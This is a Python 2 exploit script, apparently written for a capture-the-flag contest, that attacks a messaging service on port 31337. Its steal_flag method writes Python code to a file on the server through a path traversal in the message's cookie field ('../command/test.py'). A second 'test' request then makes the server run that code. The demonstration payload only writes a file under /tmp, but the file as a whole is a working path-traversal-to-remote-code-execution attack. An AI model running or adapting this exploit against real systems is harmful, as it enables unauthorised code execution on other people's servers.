#!/usr/bin/env python
#2.6
import sys
import os
import getopt
import socket
import threading
import select
import logging
import string
import signal
import xml.dom.minidom 
import MySQLdb
import struct
import binascii
import random
import time
debug = 1


class MsgUser(object):

    PORT = 31337

    def __init__(self, ip):
        self.ip = ip

    def steal_flag(self):
        cookie = '../command/test.py'
        username = "TEST"

        msgtime = time.strftime("%Y-%m-%d %H:%M:%S")
        subject =  """
with open('/tmp/luca','w') as f:
    f.write('wazzaa!')
def run():
    print "CODE EXECUTING"
"""
        body = "4"
        group =  "ciao"
        message ="""SEND %s .oOo.
        <msg>
          <time>%s</time>
          <sender>%s</sender>
          <group>%s</group>
          <subject>%s</subject>
          <msgbody>%s</msgbody>
        </msg>
        .oOo.
        """ % (cookie, msgtime, username, group, subject, body)

        message_exec="""test %s .oOo.
        <msg>
          <time>%s</time>
          <sender>%s</sender>
          <group>%s</group>
          <subject>%s</subject>
          <msgbody>%s</msgbody>
        </msg>
        .oOo.
        """ % (cookie, msgtime, username, group, subject, body)

        if debug:
            print "Sending compound sms message: %s" % message

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.PORT))
            smsfd = s.makefile()
            s.send(message)
            while True:
                response = smsfd.readline().strip()
                if response == "":
                    break;
                print "Received reply: %s" % response
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.PORT))
            smsfd = s.makefile()
            s.send(message_exec)
            while True:
                response = smsfd.readline().strip()
                if response == "":
                    break;
                print "Received reply: %s" % response
            s.close()
        except Exception, err:
            print "Msg dispatcher is down: cannot set flag", err


def usage():
    print """
USAGE:
    get IP COOKIE
    set IP FLAG
    test IP
"""

if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage()
        sys.exit(1)
    user = MsgUser(sys.argv[2])
    if sys.argv[1] == 'set':
        user.steal_flag()
    else:
        usage()

